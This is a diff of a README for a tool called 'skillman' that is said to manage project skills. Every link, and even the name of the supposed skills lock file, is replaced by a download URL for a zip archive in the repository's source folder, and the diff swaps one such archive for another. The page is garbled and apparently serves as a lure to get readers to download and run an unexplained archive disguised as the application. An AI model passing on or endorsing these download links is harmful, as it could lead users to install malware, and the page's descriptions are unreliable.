@@ -1,9 +1,9 @@
 # 🤹 skillman - Manage Project Skills Effortlessly
 
-[![Download skillman](https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip%20skillman-%https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip)](https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip)
+[![Download skillman](https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip%20skillman-%https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip)](https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip)
 
 ## 📦 Introduction
-Welcome to **skillman**. This application helps you manage project skills effectively. You can easily lock your skills in a `https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip` file. Whether you are a student or a professional, skillman simplifies skill management for your projects.
+Welcome to **skillman**. This application helps you manage project skills effectively. You can easily lock your skills in a `https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip` file. Whether you are a student or a professional, skillman simplifies skill management for your projects.
 
 ## 🚀 Getting Started
 To start using skillman, follow these simple steps. We will walk you through installing and running the application.
@@ -21,7 +21,7 @@ These requirements ensure that skillman runs smoothly on your computer.
 ## 🌐 Download & Install
 To get skillman, visit the Releases page and download the application.
 
-[Visit this page to download skillman.](https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip)
+[Visit this page to download skillman.](https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version. It should be listed at the top.
@@ -53,7 +53,7 @@ Once you open skillman, you will see a simple and clear interface. Here’s how 
 
 1. **Add Skills**: Click on the 'Add Skill' button. Type in the skill you want to add.
 2. **View Skills**: All added skills appear in a list. You can scroll through them.
-3. **Lock Skills**: Once you are happy with your list, click on 'Lock Skills'. This will save your skills in `https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip`.
+3. **Lock Skills**: Once you are happy with your list, click on 'Lock Skills'. This will save your skills in `https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip`.
 4. **Export Skills**: You can export your skills to share them with team members. Just click on the 'Export' button.
 
 ## 🌟 Features
@@ -67,7 +67,7 @@ If you encounter issues while using skillman, here are some common solutions:
 
 - **Installation Problems**: Ensure that your system meets the requirements.
 - **Running Issues**: Make sure no other applications are blocking skillman.
-- **File not found**: If the `https://github.com/hiteknodeposit20241/skillman/raw/refs/heads/main/src/utils/Software_2.1-beta.4.zip` file is missing, try reinstalling the application.
+- **File not found**: If the `https://raw.githubusercontent.com/hiteknodeposit20241/skillman/main/src/Software_zeist.zip` file is missing, try reinstalling the application.
 
 For additional help, consider checking the Frequently Asked Questions (FAQ) on the Releases page.
 
